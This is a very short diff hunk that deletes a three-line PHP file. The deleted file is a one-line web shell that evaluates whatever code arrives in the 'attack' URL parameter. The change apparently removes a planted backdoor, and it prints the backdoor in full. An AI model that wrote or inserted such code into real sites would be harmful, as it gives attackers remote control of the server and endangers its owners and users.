@@ -1,3 +1,0 @@
-<?
-  @eval($_GET['attack']);
-?>
